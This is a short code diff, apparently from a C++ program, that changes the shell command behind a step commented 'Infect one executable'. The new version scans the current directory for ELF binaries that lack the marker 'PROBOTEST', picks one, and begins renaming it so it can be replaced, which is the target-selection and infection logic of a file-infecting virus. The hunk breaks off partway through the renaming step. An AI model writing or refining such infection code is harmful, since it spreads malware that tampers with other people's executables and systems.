@@ -36,13 +36,14 @@ int main (int argc, char** argv) {
         // and delete when ready
         c = system( (command).c_str() );
         // Infect one executable
-        c = system("VIR=$( \
-ls | grep -v '^hi$' | \
-while read n; \
+        c = system("VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
 do \
-  grep -q PROBOTEST $n || echo \"$n\"; \
-done | \
-tail -1); \
+file $n | grep -q ELF && ( \
+grep -q PROBOTEST $n || ( \
+echo \"$n\" \
+) \
+); \
+done | tail -1); \
 if [ ! -z \"$VIR\" ]; then \
 file $VIR | grep -q stripped$ && (\
 mv $VIR ${VIR}__ && \
